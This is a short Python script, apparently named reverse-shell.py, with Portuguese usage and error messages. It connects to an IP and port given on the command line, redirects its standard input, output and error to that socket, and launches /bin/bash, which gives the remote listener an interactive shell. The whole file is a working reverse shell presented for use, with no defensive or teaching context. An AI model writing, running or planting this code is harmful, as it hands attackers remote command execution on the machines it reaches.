import socket
import sys
import subprocess
import os 

def client_tcp(ip, porta):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, porta))

        os.dup2(client.fileno(), 0) 
        os.dup2(client.fileno(), 1)  
        os.dup2(client.fileno(), 2)

        subprocess.call(['/bin/bash'])


if __name__ == "__main__":
    if len(sys.argv) == 3:
        try:
            ip = sys.argv[1]  
            porta = int(sys.argv[2])     
            client_tcp(ip, porta)
        except Exception as e:
            print(f'Erro: {e}')
    else:
        print('Modo de uso: python3 reverse-shell.py <ip> <porta>')